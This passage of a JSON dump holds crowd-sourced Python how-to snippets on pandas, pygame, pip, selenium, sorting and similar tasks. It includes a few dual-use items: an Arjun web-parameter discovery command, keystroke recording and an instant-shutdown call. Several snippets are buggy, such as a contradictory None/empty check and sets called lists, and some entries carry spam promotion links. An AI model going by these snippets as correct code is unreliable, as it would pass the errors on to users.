    "description": "# assignment copy df = df.set_index('month')  # or inplace df.set_index('month', inplace=True)  #      year   sale  month            month  year   sale #  0   2012   55    1                1      2012   55 #  1   2014   40    4       =>       4      2014   40 #  2   2013   84    7                7      2013   84 #  3   2014   31    10               10     2014   31\n",
    "reg_date": "2021-10-12T11:30:56.000Z"
  },
  {
    "id": 1960,
    "keyword": null,
    "link": null,
    "title": " how to set interval in python",
    "description": "# this makes program sleep in intervals from time import time, sleep while True:     sleep(1 - time() % 1) # run every 1 second... you can change that \t# thing to run\n# This runs test() function in intervals of 1 second from threading import Timer run = True def test(): \tglobal run \tprint(\"something\") \tif run: \t\tTimer(1, test).start()  test() # now whenever you set run to False the test function won't run anymore # and of course if you dont set it to False it will run forever\n",
    "reg_date": "2021-10-12T11:30:56.000Z"
  },
  {
    "id": 1961,
    "keyword": null,
    "link": null,
    "title": " how to set learning rate in keras",
    "description": "opt = keras.optimizers.Adam(learning_rate=0.01) model.compile(loss='categorical_crossentropy', optimizer=opt)\n",
    "reg_date": "2021-10-12T11:30:56.000Z"
  },
  {
    "id": 1962,
    "keyword": null,
    "link": null,
    "title": " how to set required drf serialzier",
    "description": "class MySerializer(serializer.Modelserializer): \tclass Meta:     \tmodel = MyModel         fields = ['id', 'title']          \textra_kwargs = { \t\t\"title\": {\"required\": False} \t}\n",
    "reg_date": "2021-10-12T11:30:56.000Z"
  },
  {
    "id": 1963,
    "keyword": null,
    "link": null,
    "title": " how to set screen brightness automatically depending on battery percentage using python",
    "description": "import psutil import screen_brightness_control as screen while True:     battery =  psutil.sensors_battery()     if battery.power_plugged == True:         screen.set_brightness(50)     elif battery.percent >= 30 and battery.power_plugged == False:         screen.set_brightness(0)\n",
    "reg_date": "2021-10-12T11:30:56.000Z"
  },
  {
    "id": 1964,
    "keyword": null,
    "link": null,
    "title": " how to set the icon of the window in pygame",
    "description": "icon = pygame.image.load('icon.png') pygame.display.set_icon(icon)\n",
    "reg_date": "2021-10-12T11:30:56.000Z"
  },
  {
    "id": 1965,
    "keyword": null,
    "link": null,
    "title": " how to set the location on a pygame window",
    "description": "    pos_x = screen_width / 2 - window_width / 2     pos_y = screen_height - window_height     os.environ['SDL_VIDEO_WINDOW_POS'] = '%i,%i' % (pos_x,pos_y)     os.environ['SDL_VIDEO_CENTERED'] = '0'\n",
    "reg_date": "2021-10-12T11:30:56.000Z"
  },
  {
    "id": 1966,
    "keyword": null,
    "link": null,
    "title": " how to set the screen brightness using python",
    "description": "pip install screen-brightness-control\nimport screen_brightness_control as screen sent_the_brightness = screen.set_brightness(10) get = screen.get_brightness() print(get)\n",
    "reg_date": "2021-10-12T11:30:57.000Z"
  },
  {
    "id": 1967,
    "keyword": null,
    "link": null,
    "title": " how to set the size of a gui in python",
    "description": "root.geometry('69x420')\n# Change window_name to the name of the window object, i.e. root window_name.geometry(\"500x500\") # To ensure widgets resize: widget_name.pack(fill=\"both\", expand=True)\nwin.geometry(\"250x250\")\n",
    "reg_date": "2021-10-12T11:30:57.000Z"
  },
  {
    "id": 1968,
    "keyword": null,
    "link": null,
    "title": " how to setup pygame",
    "description": "# To install pygame, type 'pip install pygame' in the  # windows powershell or the os terminal  # To create a blank screen as a setup for a game, use: import pygame import sys  pygame.init()  clock = pygame.time.Clock()  FPS = 30 # How many times the screen will update per second  screen_width = 600 # How wide the window will be screen_height = 600 # how high the window will be  screen = pygame.display.set_mode((screen_width, screen_height)) # creates the screen  while True:     clock.tick(FPS) # updates the screen, the amount of times it does so depends on the FPS     for event in pygame.event.get(): # Allows you to add various events         if event.type == pygame.QUIT: # Allows the user to exit using the X button             pygame.quit()             sys.exit()          \n#go to terminal pip download pygame\npython3 -m pip install -U pygame==2.0.0.dev6\nimport pygame pygame.init()  win = pygame.display.set_mode((500,500)) pygame.display.set_caption(\"First Game\")  x = 50 y = 50 width = 40 height = 60 vel = 5  run = True  while run:     pygame.time.delay(100) # This will delay the game the given amount of milliseconds. In our casee 0.1 seconds will be the delay      for event in pygame.event.get():  # This will loop through a list of any keyboard or mouse events.         if event.type == pygame.QUIT: # Checks if the red button in the corner of the window is clicked             run = False  # Ends the game loop  pygame.quit()  # If we exit the loop this will execute and close our game     \npy -m pip install -U pygame --user  \n# Simple pygame program  2   3 # Import and initialize the pygame library  4 import pygame  5 pygame.init()  6   7 # Set up the drawing window  8 screen = pygame.display.set_mode([500, 500])  9  10 # Run until the user asks to quit 11 running = True 12 while running: 13  14     # Did the user click the window close button? 15     for event in pygame.event.get(): 16         if event.type == pygame.QUIT: 17             running = False 18  19     # Fill the background with white 20     screen.fill((255, 255, 255)) 21  22     # Draw a solid blue circle in the center 23     pygame.draw.circle(screen, (0, 0, 255), (250, 250), 75) 24  25     # Flip the display 26     pygame.display.flip() 27  28 # Done! Time to quit. 29 pygame.quit()\n",
    "reg_date": "2021-10-12T11:30:57.000Z"
  },
  {
    "id": 1969,
    "keyword": null,
    "link": null,
    "title": " how to shutdown a computer with python",
    "description": "import os  os.system(\"shutdown /s /t 1\")\n import os   os.system(\"shutdown /s /t 1\")\n",
    "reg_date": "2021-10-12T11:30:57.000Z"
  },
  {
    "id": 1970,
    "keyword": null,
    "link": null,
    "title": " how to simulate a key press in python",
    "description": "# in command prompt, type \"pip install pynput\" to install pynput. from pynput.keyboard import Key, Controller  keyboard = Controller() key = \"a\"  keyboard.press(key) keyboard.release(key)\npip install keyboard  import keyboard  keyboard.press_and_release('shift+s, space')  keyboard.write('The quick brown fox jumps over the lazy dog.')  keyboard.add_hotkey('ctrl+shift+a', print, args=('triggered', 'hotkey'))  # Press PAGE UP then PAGE DOWN to type \"foobar\". keyboard.add_hotkey('page up, page down', lambda: keyboard.write('foobar'))  # Blocks until you press esc. keyboard.wait('esc')  # Record events until 'esc' is pressed. recorded = keyboard.record(until='esc') # Then replay back at three times the speed. keyboard.play(recorded, speed_factor=3)  # Type @@ then press space to replace with abbreviation. keyboard.add_abbreviation('@@', 'my.long.email@example.com')  # Block forever, like `while True`. keyboard.wait()\n",
    "reg_date": "2021-10-12T11:30:57.000Z"
  },
  {
    "id": 1971,
    "keyword": null,
    "link": null,
    "title": " how to slicing dataframe using two conditions",
    "description": "# when you wrap conditions in parantheses, you give order # you do those in brackets first before 'and' # AND movies[(movies.duration >= 200) & (movies.genre == 'Drama')] \n",
    "reg_date": "2021-10-12T11:30:57.000Z"
  },
  {
    "id": 1972,
    "keyword": null,
    "link": null,
    "title": " how to sort a dictionary by value in python",
    "description": "s = {1: 1, 7: 2, 4: 2, 3: 1, 8: 1} k = dict(sorted(s.items(),key=lambda x:x[0],reverse = True)) print(k)\nx = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0}  sort_by_key = dict(sorted(x.items(),key=lambda item:item[0])) sort_by_value = dict(sorted(x.items(), key=lambda item: item[1]))  print(\"sort_by_key:\", sort_by_key) print(\"sort_by_value:\", sort_by_value)  # sort_by_key: {0: 0, 1: 2, 2: 1, 3: 4, 4: 3} # sort_by_value: {0: 0, 2: 1, 1: 2, 4: 3, 3: 4}\nimport operator x = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} sorted_x = sorted(x.items(), key=operator.itemgetter(1))   # Sort by key import operator x = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} sorted_x = sorted(x.items(), key=operator.itemgetter(0)) \nd = {'one':1,'three':3,'five':5,'two':2,'four':4}  # Sort a = sorted(d.items(), key=lambda x: x[1])  # Reverse sort r = sorted(d.items(), key=lambda x: x[1], reverse=True)\nx = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} sorted_dict = {k: v for k, v in sorted(x.items(), key=lambda item: item[1])} print(sorted_dict) #{0: 0, 2: 1, 1: 2, 4: 3, 3: 4}\nx = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} {k: v for k, v in sorted(x.items(), key=lambda item: item[1])} {0: 0, 2: 1, 1: 2, 4: 3, 3: 4}\n",
    "reg_date": "2021-10-12T11:30:57.000Z"
  },
  {
    "id": 1973,
    "keyword": null,
    "link": null,
    "title": " how to sort a list by the second element in tuple python",
    "description": "# lists_of_tuples = [('item', 'price'), ('item', 'price'), ('item', 'price')] def sort_prices(list_of_tuples): #sort the list b*y the price of each tuple     list_of_tuples.sort(key=lambda x: x[1], reverse=True) #earse the \"reverse\" part to sort in small to big.     return list_of_tuples, print(list_of_tuples)\n",
    "reg_date": "2021-10-12T11:30:57.000Z"
  },
  {
    "id": 1974,
    "keyword": null,
    "link": null,
    "title": " how to sort a list in python using lambda",
    "description": "data = [(\"Apples\", 5, \"20\"), (\"Pears\", 1, \"5\"), (\"Oranges\", 6, \"10\")]  data.sort(key=lambda x:x[0]) print(data) OUTPUT [('Apples', 5, '20'), ('Oranges', 6, '10'), ('Pears', 1, '5')]  from kite.com ^^\na = sorted(a, key=lambda x: x.modified, reverse=True)\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1975,
    "keyword": null,
    "link": null,
    "title": " how to sort dataframe multi columns with multi ascending values",
    "description": "df = df.sort_values([\"b\", \"c\"], ascending = (False, True))\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1976,
    "keyword": null,
    "link": null,
    "title": " how to sort in pandas",
    "description": "#Python, Pandas #Sorting dataframe df on the values of a column col1 #Temporary df.sort_values(by=[\"col1\"])   #Permanent df.sort_values(by=[\"col1\"], inplace = True)\n>>> df.sort_values(by=['col1'], ascending = False)     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \n>>> df.sort_values(by=['col1'])     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \n// Single sort  >>> df.sort_values(by=['col1'],ascending=False) // ascending => [False(reverse order) & True(default)] // Multiple Sort >>> df.sort_values(by=['col1','col2'],ascending=[True,False]) // with apply()  >>> df[['col1','col2']].apply(sorted,axis=1) // axis = [1 & 0], 1 = 'columns', 0 = 'index'\nDataFrame.sort_values(self, by, axis=0, ascending=True,                       inplace=False, kind='quicksort',                       na_position='last',                       ignore_index=False)  # Example df.sort_values(by=['ColToSortBy'])\n# Basic syntax: import pandas as pd df.sort_values(by=['col1'])  # Note, this does not sort in place unless you add inplace=True # Note, add ascending=False if you want to sort in decreasing order # Note, to sort by more than one column, add other column names to the #\tlist like by=['col1', 'col2']\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1977,
    "keyword": null,
    "link": null,
    "title": " how to sort list in descending order in python",
    "description": "# there are two types of lists # returns new list sorted(list_name, reverse=True)  # changes list in place list_name.sort(reverse=True)\n#1 Changes list list.sort(reverse=True) #2 Returns sorted list sorted(list, reverse=True)\n# defning A as a list A.sort(reverse = True)\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1978,
    "keyword": null,
    "link": null,
    "title": " how to speak the text with python",
    "description": "#pip install pyttsx3 in the prompt import pyttsx3 def speak(text):   if text == None and text == \"\":     return \"The argument text is None or empty\"   speaking = pyttsx3.speak(text)   return speaking\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1979,
    "keyword": null,
    "link": null,
    "title": " how to specify an input type to a function in python",
    "description": "def function(input1: int, input2: float, input3: bool, input4: list, input5: str):   pass\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1980,
    "keyword": null,
    "link": null,
    "title": " how to split a string in python with multiple delimiters",
    "description": "str = 'Lorem; ipsum. dolor sit amet, consectetur adipiscing elit.' str = str.split(',') print(str) # Output ['Lorem; ipsum. dolor sit amet', ' consectetur adipiscing elit.']  import re str = 'Lorem; ipsum. dolor sit amet, consectetur adipiscing elit.' str = re.split(r';|,|\\.', str) print(str) # Output ['Lorem', ' ipsum', ' dolor sit amet', ' consectetur adipiscing elit', '']\n>>> a='Beautiful, is; better*than\\nugly' >>> import re >>> re.split('; |, |\\*|\\n',a) ['Beautiful', 'is', 'better', 'than', 'ugly']\nline = \"<html><head>\" d = \">\" s =  [e+d for e in line.split(d) if e] print(s) #Output: #[\"<html>\", \"<head>\"]\n#Do a str.replace('? ', ', ') and then a str.split(', ') #Example: a = \"Hello, what is your name? I'm Bob.\" a.replace('? ', ', ') print(a) #\"Hello, what is your name, I'm Bob.\" a.split(\", \") print(a) #[\"Hello\", \"what is your name\", \"I'm Bob.\"]\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1981,
    "keyword": null,
    "link": null,
    "title": " how to split an input in python by comma",
    "description": "lst = input().split(',')\n string = input('Input')     >>> 1,2     print(cord.split(','))     >>>['1', '2']\nlst = input().split(',')#can use any seperator value inside '' of split print (lst) #given input = hello,world #output: ['hello', 'world'] #another example  lst = input().split(' ; ')#can use any seperator value inside '' of split print (lst) #given input = hello ; world ; hi there #output: ['hello', 'world', 'hi there']\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1982,
    "keyword": null,
    "link": null,
    "title": " how to split and keep delimiter at the same line in python",
    "description": "#split and keep the dlimeters at the end of the line. #Ex, using the '.'  '?'  '!' as delimeters.  re.split('(?<=!)|(?<=\\.)|(?<=\\?)', text)\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1983,
    "keyword": null,
    "link": null,
    "title": " how to split channels wav python",
    "description": "import wave import numpy as np  def save_wav_channel(fn, wav, channel):     '''     Take Wave_read object as an input and save one of its     channels into a separate .wav file.     '''     # Read data     nch   = wav.getnchannels()     depth = wav.getsampwidth()     wav.setpos(0)     sdata = wav.readframes(wav.getnframes())      # Extract channel data (24-bit data not supported)     typ = { 1: np.uint8, 2: np.uint16, 4: np.uint32 }.get(depth)     if not typ:         raise ValueError(\"sample width {} not supported\".format(depth))     if channel >= nch:         raise ValueError(\"cannot extract channel {} out of {}\".format(channel+1, nch))     print (\"Extracting channel {} out of {} channels, {}-bit depth\".format(channel+1, nch, depth*8))     data = np.fromstring(sdata, dtype=typ)     ch_data = data[channel::nch]      # Save channel to a separate file     outwav = wave.open(fn, 'w')     outwav.setparams(wav.getparams())     outwav.setnchannels(1)     outwav.writeframes(ch_data.tostring())     outwav.close()  wav = wave.open(WAV_FILENAME) save_wav_channel('ch1.wav', wav, 0) save_wav_channel('ch2.wav', wav, 1)\n",
    "reg_date": "2021-10-12T11:30:58.000Z"
  },
  {
    "id": 1984,
    "keyword": null,
    "link": null,
    "title": " how to square each term of numpy array python",
    "description": "np.square(arr1)\n",
    "reg_date": "2021-10-12T11:30:59.000Z"
  },
  {
    "id": 1985,
    "keyword": null,
    "link": null,
    "title": " how to start ftpd server with python",
    "description": "#first install pyftpdlib pip install pyftpdlib #then start an ftp server python -m pyftpdlib -p 21 w\n",
    "reg_date": "2021-10-12T11:30:59.000Z"
  },
  {
    "id": 1986,
    "keyword": null,
    "link": null,
    "title": " how to start off a selenuim python",
    "description": "import selenium.webdriver as webdriver driver = webdriver.Chrome() \n",
    "reg_date": "2021-10-12T11:30:59.000Z"
  },
  {
    "id": 1987,
    "keyword": null,
    "link": null,
    "title": " how to stop python for certain time in python",
    "description": "import time How_long = 5 time.sleep(How_long) print(\"Look I got printed after 5 seconds\")\n",
    "reg_date": "2021-10-12T11:30:59.000Z"
  },
  {
    "id": 1988,
    "keyword": null,
    "link": null,
    "title": " how to stop the program in python",
    "description": "import sys  sys.exit()\n#to stop all execution of code exit()\n# Do stuff stop = input(\"Would you like to stop the program? \") if stop == \"y\":   exit() else:   # do stuff\n",
    "reg_date": "2021-10-12T11:30:59.000Z"
  },
  {
    "id": 1989,
    "keyword": null,
    "link": null,
    "title": " how to strip quotation marks in python",
    "description": "stripped_string = a_string.strip('\"')\n",
    "reg_date": "2021-10-12T11:30:59.000Z"
  },
  {
    "id": 1990,
    "keyword": null,
    "link": null,
    "title": " how to subtract 2 lists in python",
    "description": "[item for item in x if item not in y]\nmyList1 = {12,9} myList2= {3,7} subtraction = myList1-myList2 print(subtraction)\n",
    "reg_date": "2021-10-12T11:30:59.000Z"
  },
  {
    "id": 1991,
    "keyword": null,
    "link": null,
    "title": " how to sum numbers of a list in python without sum",
    "description": "please subscribe my channel - https://bit.ly/2Me2CfB  # METHOD 1 (without using the sum function) :  def list_sum(list_name):      value = 0      for values in list_name:         value += values         print(value)                   # -------------------------------------------   # METHOD 2 (using the sum function) :  p = [1,5,3,4,6,7] p_sum = sum(p)\n# to sum all the numbers we use python's sum() function a = [4,5,89,5,33,2244,56] a_total = sum(a)\nsum of list element\ndef int_list(grades):   #list is passed to the function     summ = 0      for n in grades:         summ += n         print summ \n",
    "reg_date": "2021-10-12T11:30:59.000Z"
  },
  {
    "id": 1992,
    "keyword": null,
    "link": null,
    "title": " how to switch screens in kivy",
    "description": "from kivy.uix.screenmanager import ScreenManager, Screen  # Create the manager sm = ScreenManager()  # Add few screens for i in range(4):     screen = Screen(name='Title %d' % i)     sm.add_widget(screen)  # By default, the first screen added into the ScreenManager will be # displayed. You can then change to another screen.  # Let's display the screen named 'Title 2' # A transition will automatically be used. sm.current = 'Title 2' \n",
    "reg_date": "2021-10-12T11:31:00.000Z"
  },
  {
    "id": 1993,
    "keyword": null,
    "link": null,
    "title": " how to take array input in python in single line",
    "description": "arr = list(map(int, input().split())) \narr = list(map(int, input().split()))\n",
    "reg_date": "2021-10-12T11:31:00.000Z"
  },
  {
    "id": 1994,
    "keyword": null,
    "link": null,
    "title": " how to take fast input in python",
    "description": "import sys input = sys.stdin.readline # contributed by rohit gupta\n # Fast Input and Output in Python  from sys import stdin, stdout  # For single input:  input = int(stdin.readline())  # For multiple inputs from single line:  def get_inputs():      return map(int, sys.stdin.readline().strip().split())  input1, input2, input3, input4 = get_inputs()  # For fast output  stdout.write(n1) stdout.write(str(input1) + '\\n' + str(input2) + '\\n' + str(input3))  # Contributed by Supantha Roy \n",
    "reg_date": "2021-10-12T11:31:00.000Z"
  },
  {
    "id": 1995,
    "keyword": null,
    "link": null,
    "title": " how to take list of float as input in python",
    "description": "float_list = list(map(float, input().split()))\n",
    "reg_date": "2021-10-12T11:31:00.000Z"
  },
  {
    "id": 1996,
    "keyword": null,
    "link": null,
    "title": " how to take screenshot using python",
    "description": "please check out my video also - https://www.youtube.com/watch?v=7Tr0mEQhc3M&t=2s please subscribe my channel - https://bit.ly/2Me2CfB  # importing the ImageGrab function from PILLOW (PIL) Module from PIL import ImageGrab  # to take the screenshot of your pc (Main Function) screenshot = ImageGrab.grab()  # saving the screenshot in your pc (screenshot will be saved in the directory you are working) screenshot.save()  # To open the screenshot in the default image viewer (Optional) screenshot.show()\nimport pyautogui import tkinter as tk import time root= tk.Tk()  canvas1 = tk.Canvas(root, width = 300, height = 300)  canvas1.pack()  def takeScreenshot ():     current_time = time.time()     myScreenshot = pyautogui.screenshot()     myScreenshot.save(r'D:\\videos\\Mannuly\\Taken'+str(current_time)+\".png\")  myButton = tk.Button(text='Take Screenshot', command=takeScreenshot, bg='green',fg='white',font= 10) canvas1.create_window(150, 150, window=myButton)  root.mainloop()\n",
    "reg_date": "2021-10-12T11:31:00.000Z"
  },
  {
    "id": 1997,
    "keyword": null,
    "link": null,
    "title": " how to take screenshots with selenium webdriver python",
    "description": "driver.save_screenshot(\"screenshot.png\")\nfrom selenium import webdriver from time import sleep  driver = webdriver.Firefox() driver.get('https://www.python.org') sleep(1)  driver.get_screenshot_as_file(\"screenshot.png\") driver.quit() print(\"end...\")\n",
    "reg_date": "2021-10-12T11:31:00.000Z"
  },
  {
    "id": 1998,
    "keyword": null,
    "link": null,
    "title": " how to tell python to create a random numer",
    "description": "# generate random integer values from random import randint  value = randint(0, 10) print(value) \n# generate random integer values from random import seed from random import randint # seed random number generator seed(1) # generate some integers for _ in range(10): \tvalue = randint(0, 10) \tprint(value) \n#to choose a random number simply do this import random print(random.randint(1, 100))\nimport random a = (random.randint(bottom value, top value)\n",
    "reg_date": "2021-10-12T11:31:00.000Z"
  },
  {
    "id": 1999,
    "keyword": null,
    "link": null,
    "title": " how to time a python script",
    "description": "from datetime import datetime start = datetime.now() # some kind of code print(datetime.now() - start)\nfrom timer import Timer t = Timer() t.start() # Run stuff here. t.stop()  \n",
    "reg_date": "2021-10-12T11:31:00.000Z"
  },
  {
    "id": 2000,
    "keyword": null,
    "link": null,
    "title": " how to trim mp4 with moviepy",
    "description": "from moviepy.video.io.ffmpeg_tools import ffmpeg_extract_subclip # ffmpeg_extract_subclip(\"full.mp4\", start_seconds, end_seconds, targetname=\"cut.mp4\") ffmpeg_extract_subclip(\"full.mp4\", 60, 300, targetname=\"cut.mp4\") \n",
    "reg_date": "2021-10-12T11:31:00.000Z"
  },
  {
    "id": 2001,
    "keyword": null,
    "link": null,
    "title": " how to turn python vs code into a executable",
    "description": "pip install pyinstaller  cd YourFilePath  pyinstaller --onefile YourFileName\n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2002,
    "keyword": null,
    "link": null,
    "title": " how to uinstall a package in python",
    "description": "# INSTALLING A PACKAGE  pip install <package>  # UINSTALLING A PACKAGE  pip uninstall <package>  # UPDATING A PACKAGE  pip install --upgrade --user <package>\n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2003,
    "keyword": null,
    "link": null,
    "title": " how to unzip files using zipfile module python",
    "description": "import zipfile with zipfile.ZipFile(\"file.zip\",\"r\") as zip_ref:     zip_ref.extractall(\"targetdir\")\n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2004,
    "keyword": null,
    "link": null,
    "title": " how to update a module in python",
    "description": "pip install [package] --upgrade\n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2005,
    "keyword": null,
    "link": null,
    "title": " how to update pandas",
    "description": "pip3 install --upgrade pandas \n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2006,
    "keyword": null,
    "link": null,
    "title": " how to update pip in anaconda prompt",
    "description": "python -m pip install --upgrade pip\n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2007,
    "keyword": null,
    "link": null,
    "title": " how to update pip in python",
    "description": "python -m pip install --upgrade pip \npython -m pip install --upgrade pip\npython -m pip install --upgrade pip python3 -m pip install --upgrade pip # on mac \n#for updating pip type the following command in terminal or cmd or powershell python -m pip install --upgrade pip\n# Using the Anaconda Prompt python -m pip install --upgrade pip\nsudo pip3 install --upgrade pip\n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2008,
    "keyword": null,
    "link": null,
    "title": " how to update pip python",
    "description": "python -m pip install --upgrade pip \npython -m pip install --upgrade pip\npython -m pip install --upgrade pip python3 -m pip install --upgrade pip # on mac \n#for updating pip type the following command in terminal or cmd or powershell python -m pip install --upgrade pip\n# Using the Anaconda Prompt python -m pip install --upgrade pip\npip install [package_name] -U\n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2009,
    "keyword": null,
    "link": null,
    "title": " how to update screen in pygame",
    "description": "pygame.display.update()\n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2010,
    "keyword": null,
    "link": null,
    "title": " how to upgrade 3.6 to 3.7 on linux",
    "description": "sudo apt-get install python3.7\n",
    "reg_date": "2021-10-12T11:31:01.000Z"
  },
  {
    "id": 2011,
    "keyword": null,
    "link": null,
    "title": " how to upgrade pip",
    "description": "python -m pip install --upgrade pip \npython -m pip install --upgrade pip\npython -m pip install --upgrade pip python3 -m pip install --upgrade pip # on mac \n#for updating pip type the following command in terminal or cmd or powershell python -m pip install --upgrade pip\npip install  python -m pip install --upgrade pip\n# Using the Anaconda Prompt python -m pip install --upgrade pip\n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2012,
    "keyword": null,
    "link": null,
    "title": " how to upload a file in colab",
    "description": "# It will prompt you to select a file. Click on &ldquo;Choose Files&rdquo; then select and upload the file. Wait for the file to be 100% uploaded.  from google.colab import files uploaded = files.upload()  # To store dataset in a Pandas Dataframe import io df2 = pd.read_csv(io.BytesIO(uploaded['Filename.csv']))\nfrom google.colab import files files.upload() \nfrom google.colab import files files.upload()\n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2013,
    "keyword": null,
    "link": null,
    "title": " how to use Qtimer in thread python",
    "description": "class DataCaptureThread(QThread):     def collectProcessData(self):         print (\"Collecting Process Data\")      def __init__(self, *args, **kwargs):         QThread.__init__(self, *args, **kwargs)         self.dataCollectionTimer = QTimer()         self.dataCollectionTimer.moveToThread(self)         self.dataCollectionTimer.timeout.connect(self.collectProcessData)      def run(self):         self.dataCollectionTimer.start(1000)         loop = QEventLoop()         loop.exec_() \n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2014,
    "keyword": null,
    "link": null,
    "title": " how to use arjun tool",
    "description": "# To find GET parameters, you can simply do:  python3 arjun.py -u https://api.example.com/endpoint --get  # Similarly, use --post for POST and --json to look for JSON parameters.\n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2015,
    "keyword": null,
    "link": null,
    "title": " how to use datetime to tell your age in python",
    "description": "today_date = datetime.datetime.now() dob = datetime.datetime(1982, 5, 20) print(today_date - dob)\n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2016,
    "keyword": null,
    "link": null,
    "title": " how to use headless browser in selenium python",
    "description": "from selenium import webdriver from selenium.webdriver.chrome.options import Options  options = Options() options.headless = True driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=options)\nfrom selenium import webdriver from selenium.webdriver.chrome.options import Options  options = Options() options.headless = True driver = webdriver.Chrome(CHROMEDRIVER_PATH, options=options)\n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2017,
    "keyword": null,
    "link": null,
    "title": " how to use if else to prove a variable even or odd in python",
    "description": "#To check if the given number is even or odd num = int(input(\"Enter a number: \")) if (num % 2) == 0:    print(\"{0} is Even\".format(num)) else:    print(\"{0} is Odd\".format(num))\n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2018,
    "keyword": null,
    "link": null,
    "title": " how to use link rel=\"icom\"",
    "description": "<link rel=\"icon\" href=\"https://illustoon.com/photo/2303.png\" type=\"image/png\" sizes=\"16x16\">\n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2019,
    "keyword": null,
    "link": null,
    "title": " how to use link rel=\"icon\"",
    "description": "<link rel=\"icon\" href=\"https://illustoon.com/photo/2303.png\" type=\"image/png\" sizes=\"16x16\">\n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2020,
    "keyword": null,
    "link": null,
    "title": " how to use postgresql with django",
    "description": "DATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql',         'NAME': 'your_database_project_name',         'USER': 'your_postgres_username',         'PASSWORD': 'your_postgres_password',         'HOST': '127.0.0.1',         'PORT': '5432',     } }\nDATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql',         'NAME': 'mydatabase',         'USER': 'mydatabaseuser',         'PASSWORD': 'mypassword',         'HOST': '127.0.0.1',         'PORT': '5432',     } } \n",
    "reg_date": "2021-10-12T11:31:02.000Z"
  },
  {
    "id": 2021,
    "keyword": null,
    "link": null,
    "title": " how to use prettytable with python",
    "description": "from prettytable import PrettyTable A = PrettyTable() A.add_column(\"Pokimon\",[\"wartortle\"]) A.add_column(\"Type\",[\"Water attack\"]) print(A) #look i don't know about these pokimones al lot so this is what i got for you\n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2022,
    "keyword": null,
    "link": null,
    "title": " how to use python to print multiplication table",
    "description": "num = int(input('Which table you need write it here:'))  starting_range = int(input('write the number from where to start:')) ending_range = int(input('write the end of the number you need:')) print() print('So This is the table of', num) for i in range(starting_range, ending_range + 1):    print(num, 'x', i, '=', num*i) \n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2023,
    "keyword": null,
    "link": null,
    "title": " how to use random in python",
    "description": "# generate random integer values from random import randint  value = randint(0, 10) print(value) \nfrom random import randint  print(randint(1,5))  ##Possible Outputs## #1 #2 #3 #4 #5\n# imports random import random # randint generates a random integar between the first parameter and the second print(random.randint(1, 100))\nimport random n = random.randint(0,22) print(n)\nimport random print(random.randint(3, 7)) #Prints a random number between 3 and 7 array = [cars, bananas, jet] print(random.choice(array)) #Prints one of the values in the array at random\n# generate random integer values from random import seed from random import randint # seed random number generator seed(1) # generate some integers for _ in range(10): \tvalue = randint(0, 10) \tprint(value) \n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2024,
    "keyword": null,
    "link": null,
    "title": " how to use sum with range python",
    "description": "res = sum(x for x in range(100, 2001) if x % 3 == 0) \n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2025,
    "keyword": null,
    "link": null,
    "title": " how to use variables in string in python",
    "description": "#Use f-string #Example:  x = 2 y = f'This is a string using variable x: {x}' print(y)  #Output:  #This is a string using variable x: 2\n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2026,
    "keyword": null,
    "link": null,
    "title": " how to use with open",
    "description": "with open('output.txt', 'w') as file:  # Use file to refer to the file object   file.write('Hi there!') # more down here # https://www.pythonforbeginners.com/files/with-statement-in-python \n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2027,
    "keyword": null,
    "link": null,
    "title": " how to view the whole dataset in jupyternotebook",
    "description": "from IPython.display import display pd.set_option('display.max_columns', None)\n",
    "reg_date": "2021-10-12T11:31:03.000Z"
  },
  {
    "id": 2028,
